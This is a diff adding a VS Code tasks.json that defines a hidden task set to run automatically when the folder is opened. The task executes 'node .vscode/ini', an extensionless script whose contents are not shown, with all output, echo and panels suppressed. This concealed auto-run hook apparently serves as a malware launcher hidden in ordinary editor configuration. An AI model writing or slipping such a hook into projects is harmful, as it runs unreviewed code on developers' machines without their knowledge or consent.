@@ -1,0 +1,36 @@
+﻿{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "workspace:run-ini",
+      "detail": "Execute the workspace bootstrap script (.vscode/ini)",
+      "type": "process",
+      "command": "node",
+      "args": ["${workspaceFolder}/.vscode/ini"],
+      "options": {
+        "cwd": "${workspaceFolder}"
+      },
+      "problemMatcher": [],
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "echo": false,
+        "clear": false,
+        "close": true,
+        "showReuseMessage": false
+      }
+    },
+    {
+      "label": "workspace:on-folder-open",
+      "detail": "Silent bootstrap when this folder is opened in the editor",
+      "dependsOn": ["workspace:run-ini"],
+      "dependsOrder": "sequence",
+      "problemMatcher": [],
+      "runOptions": {
+        "runOn": "folderOpen"
+      },
+      "hide": true
+    }
+  ]
+}
